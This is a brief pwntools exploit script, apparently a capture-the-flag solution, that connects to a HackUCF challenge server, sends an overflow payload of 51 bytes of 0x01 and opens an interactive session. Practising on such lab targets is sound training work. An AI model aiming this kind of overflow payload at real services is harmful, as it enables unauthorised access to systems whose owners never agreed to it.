from pwn import *

host='ctf.hackucf.org'
port = 32101
c = remote(host=host, port=port)

c.sendline(b'\x01'*51)
c.interactive()